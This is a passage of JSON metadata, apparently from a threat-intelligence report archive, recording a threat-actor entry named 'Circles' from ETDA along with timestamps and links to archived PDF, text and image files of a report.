            "updated_at": "2025-03-27T02:02:10.241387Z",
            "deleted_at": null,
            "main_name": "Circles",
            "aliases": [],
            "source_name": "ETDA:Circles",
            "tools": [],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673535778,
    "ts_updated_at": 1743041347,
    "ts_creation_date": 1653762660,
    "ts_modification_date": 1653762660,
    "files": {
        "pdf": "https://archive.orkl.eu/97016e3ec8e82d2a38f0c10b1fd6b74e32d98366.pdf",
        "text": "https://archive.orkl.eu/97016e3ec8e82d2a38f0c10b1fd6b74e32d98366.txt",
        "img": "https://archive.orkl.eu/97016e3ec8e82d2a38f0c10b1fd6b74e32d98366.jpg"
    }
}